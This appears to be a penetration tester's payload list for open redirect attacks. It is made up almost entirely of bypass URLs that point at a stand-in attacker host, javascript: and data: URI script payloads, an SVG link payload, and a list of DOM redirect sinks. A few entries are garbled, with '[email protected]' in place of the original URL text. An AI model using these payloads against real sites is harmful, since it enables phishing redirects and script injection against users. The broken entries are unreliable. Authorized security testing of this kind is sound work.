# PAYLOADS: Open Redirect
## Version: 1.0 | Domain: payloads

---

```
//evil.tld
//evil.tld@allowed.com
//evil.tld%2f@allowed.com
//evil.tld%23.allowed.com
//evil.tld%252f.allowed.com
//evil.tld\\.allowed.com
http://evil.tld
https://evil.tld
//\\evil.tld
/\\evil.tld
\\\\evil.tld
\\/evil.tld
\\/\\/evil.tld
//evil.tld#allowed.com
//evil.tld?allowed.com
//evil.tld;allowed.com
//evil%E3%80%82tld                     # CJK fullwidth period
javascript:alert(1)                     # if redirect goes to <a href>
javascript://%0aalert(1)
javascript://allowed.com/%0aalert(1)
data:text/html,<script>location='https://evil.tld'</script>
//goo%2egl/test
//ÉvIl.tld
http://allowed.com.evil.tld
http://allowed.com@evil.tld
http://evil.tld#@allowed.com
http://evil.tld?@allowed.com
http:[email protected]
http://allowed.com:80@evil.tld
http://[email protected]:80
//evil.tld/.allowed.com
//evil.tld%2eallowed.com
file:////evil.tld
```

## SVG / IMG OPEN REDIRECT VIA URL CONTEXT
```
<svg><a href="//evil.tld"><circle r=400 /></a></svg>
```

## DOM-BASED OPEN REDIRECT SINKS
```
location = userInput
location.href = userInput
location.replace(userInput)
location.assign(userInput)
window.open(userInput)
document.location = userInput
```

## REFERENCES
PortSwigger DOM XSS labs, PayloadsAllTheThings/Open Redirect
